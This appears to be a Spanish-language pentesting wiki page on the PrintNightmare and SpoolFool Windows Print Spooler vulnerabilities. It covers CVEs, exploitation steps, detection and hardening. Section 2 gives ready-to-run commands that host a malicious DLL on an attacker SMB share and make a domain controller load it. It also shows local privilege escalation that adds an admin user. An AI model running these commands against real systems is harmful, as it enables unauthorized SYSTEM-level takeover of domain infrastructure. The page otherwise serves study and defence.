# PrintNightmare (RCE/LPE de Windows Print Spooler)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare es el nombre colectivo dado a una familia de vulnerabilidades en el servicio **Print Spooler** de Windows que permiten la **ejecución arbitraria de código como SYSTEM** y, cuando el spooler es accesible mediante RPC, la **ejecución remota de código (RCE) en controladores de dominio y servidores de archivos**. Los CVE más explotados son **CVE-2021-1675** (inicialmente clasificado como LPE) y **CVE-2021-34527** (RCE completo). Problemas posteriores, como **CVE-2021-34481 (“Point & Print”)** y **CVE-2022-21999 (“SpoolFool”)**, demuestran que la superficie de ataque todavía está lejos de estar cerrada.

Si buscas **coerción de autenticación / relay** mediante el spooler en lugar de **RCE/LPE basado en drivers**, consulta [esta otra página sobre el abuso de la coerción de impresoras](printers-spooler-service-abuse.md). Esta página se centra en **cargar drivers / DLLs como SYSTEM**.

---

## 1. Componentes vulnerables y CVE

| Año | CVE | Nombre corto | Primitiva | Notas |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Parcheado en la CU de junio de 2021, pero evadido mediante CVE-2021-34527|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|`AddPrinterDriverEx` permite a usuarios autenticados cargar una DLL de driver desde un recurso compartido remoto; después de agosto de 2021, normalmente requiere políticas de Point & Print debilitadas|
|2021|CVE-2021-34481|“Point & Print”|LPE|Instalación de drivers sin firma por usuarios no administradores|
|2022|CVE-2022-21999|“SpoolFool”|LPE|Creación arbitraria de directorios → DLL planting; funciona después de los parches de 2021|

Todos abusan de uno de los **métodos RPC de MS-RPRN / MS-PAR** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) o de las relaciones de confianza dentro de **Point & Print**.

## 2. Técnicas de explotación

### 2.1 Compromiso remoto de un Domain Controller (CVE-2021-34527)

Un usuario de dominio autenticado pero **sin privilegios** puede ejecutar DLLs arbitrarias como **NT AUTHORITY\SYSTEM** en un spooler remoto (normalmente el DC) mediante:
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
Los PoCs más conocidos incluyen **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) y los módulos `misc::printnightmare / lsa::addsid` de Benjamin Delpy en **mimikatz**.

### 2.2 Escalada de privilegios local (cualquier Windows compatible, 2021-2024)

La misma API puede llamarse **localmente** para cargar un driver desde `C:\Windows\System32\spool\drivers\x64\3\` y obtener privilegios de SYSTEM:
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 Triage moderno en hosts parcheados

En un host completamente actualizado, los PoC públicos de PrintNightmare suelen fallar porque Windows ahora configura de forma predeterminada la instalación de drivers de impresora para que sea **solo para administradores** (`RestrictDriverInstallationToAdministrators=1` desde el 10 de agosto de 2021). Antes de lanzar un exploit contra un objetivo, comprueba primero si el entorno revirtió ese cambio de seguridad para implementaciones de impresoras heredadas:
```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```
Los dos valores débiles más interesantes suelen ser:

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

Desde Linux, confirma rápidamente que el objetivo expone las interfaces RPC de impresión relevantes antes de ejecutar un PoC:
```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```
Algunas herramientas públicas más recientes también ofrecen un flujo de trabajo más seguro de **check/list** antes de enviar una DLL:
```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```
> Si obtienes `RPC_E_ACCESS_DENIED` (`0x8001011b`) como usuario con pocos privilegios, normalmente estás observando el comportamiento predeterminado posterior a 2021, no un fallo de transporte.

> En Windows 11 22H2+ y en versiones cliente más recientes, la impresión remota usa de forma predeterminada **RPC over TCP**, y **RPC over named pipes** (`\PIPE\spoolss`) está deshabilitado a menos que se vuelva a habilitar explícitamente. Algunos PoC antiguos y apuntes de laboratorio todavía asumen que la named pipe es accesible.

### 2.4 Abuso de Package Point & Print en redes “parcheadas”

Muchos entornos empresariales siguieron siendo **vulnerables por política** después de los parches originales de 2021, porque los flujos de trabajo del helpdesk o del servidor de impresión todavía requerían que usuarios sin privilegios de administrador instalaran o actualizaran drivers. En la práctica, el playbook ofensivo pasa a ser:

- Si las indicaciones de seguridad están completamente deshabilitadas, **classic arbitrary-DLL PrintNightmare** sigue siendo el camino más corto.
- Si **Only use Package Point and Print** está habilitado, normalmente hay que pivotar hacia un camino de **signed package-aware driver** en lugar de realizar un raw DLL drop.
- Las investigaciones de 2024 demostraron que **`Package Point and Print - Approved servers` no constituye por sí solo un límite de confianza estricto**: si un atacante puede falsificar o secuestrar la resolución de nombres de un print server aprobado, las víctimas todavía pueden ser redirigidas a un servidor malicioso que cumpla las comprobaciones de la política.
- Incluso combinar el endurecimiento de UNC con RPC-over-SMB forzado puede ser poco fiable, ya que los clientes modernos pueden **hacer fallback a RPC over TCP**.

Por eso, la explotación moderna al estilo PrintNightmare suele consistir más en **abusar de la política empresarial de implementación de impresoras** que en repetir el PoC original de 2021 sin cambios.

### 2.5 SpoolFool (CVE-2022-21999): bypass de las correcciones de 2021

Los parches de Microsoft de 2021 bloquearon la carga remota de drivers, pero **no endurecieron los permisos de los directorios**. SpoolFool abusa del parámetro `SpoolDirectory` para crear un directorio arbitrario bajo `C:\Windows\System32\spool\drivers\`, deposita una payload DLL y fuerza al spooler a cargarla:
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> El exploit funciona en Windows 7 → Windows 11 y Server 2012R2 → 2022 completamente parcheados antes de las actualizaciones de febrero de 2022

---

## 3. Detección y hunting

* **Logs de PrintService** – habilita el canal *Microsoft-Windows-PrintService/Operational* y supervisa el **Event ID 316** (driver añadido/actualizado, normalmente incluye los nombres de las DLL) tanto en intentos exitosos como fallidos. Combínalo con **Event ID 808/811** para detectar fallos sospechosos al cargar módulos/drivers del spooler.
* **Sysmon** – `Event ID 7` (Image loaded) o `11/23` (File write/delete) dentro de `C:\Windows\System32\spool\drivers\*` cuando el proceso padre sea **spoolsv.exe**.
* **Linaje de procesos** – genera una alerta cuando **spoolsv.exe** inicie `cmd.exe`, `rundll32.exe`, PowerShell o cualquier proceso hijo inesperado y no firmado.
* **Telemetría de red** – las solicitudes SMB inesperadas desde **spoolsv.exe** hacia shares controlados por el atacante o el tráfico RPC inusual de impresoras desde servidores que no deberían comportarse como print servers son indicadores de alta confianza.

## 4. Mitigación y hardening

1. **¡Parchea!** – Aplica la última actualización acumulativa en todos los hosts Windows que tengan instalado el servicio Print Spooler.
2. **Deshabilita el spooler donde no sea necesario**, especialmente en los Domain Controllers:
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **Bloquea las conexiones remotas** mientras permites la impresión local – Group Policy: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Mantén Point & Print solo para administradores** configurando:
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
Consulta la guía detallada en Microsoft KB5005652
5. Si los requisitos empresariales obligan a establecer `RestrictDriverInstallationToAdministrators=0`, trata cualquier otra política de impresoras únicamente como una **mitigación parcial**. Como mínimo, prioriza **package-aware drivers**, habilita **Only use Package Point and Print** y restringe **Package Point and Print - Approved servers** a print servers explícitos del bosque.
6. **No reviertas la privacidad de printer RPC** solo para solucionar los mapeos de impresoras dañados. Los entornos que establecen `RpcAuthnLevelPrivacyEnabled=0` están deshaciendo el hardening añadido para **CVE-2021-1678** y normalmente merecen un análisis adicional durante un engagement.

---

## 5. Investigación / herramientas relacionadas

* Módulos `printnightmare` de [mimikatz](https://github.com/gentilkiwi/mimikatz/tree/master/modules)
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – implementación estándar de Impacket con los modos `-check`, `-list` y `-delete`
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – wrapper con entrega SMB integrada, soporte para múltiples objetivos y modos `MS-RPRN` / `MS-PAR`
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – abuso de un vulnerable printer driver propio mediante package Point & Print
* Exploit y write-up de SpoolFool
* Micropatches de 0patch para SpoolFool y otros bugs del spooler

Si quieres **forzar la autenticación** mediante el spooler en lugar de cargar un driver, ve a [printer spooler service abuse](printers-spooler-service-abuse.md).

---

## Referencias

* Microsoft – *KB5005652: Manage new Point & Print default driver installation behavior*
<https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872>
* Oliver Lyak – *SpoolFool: CVE-2022-21999*
<https://github.com/ly4k/SpoolFool>
* itm4n – *A Practical Guide to PrintNightmare in 2024*
<https://itm4n.github.io/printnightmare-exploitation/>
* itm4n – *The PrintNightmare is not Over Yet*
<https://itm4n.github.io/printnightmare-not-over/>
{{#include ../../banners/hacktricks-training.md}}
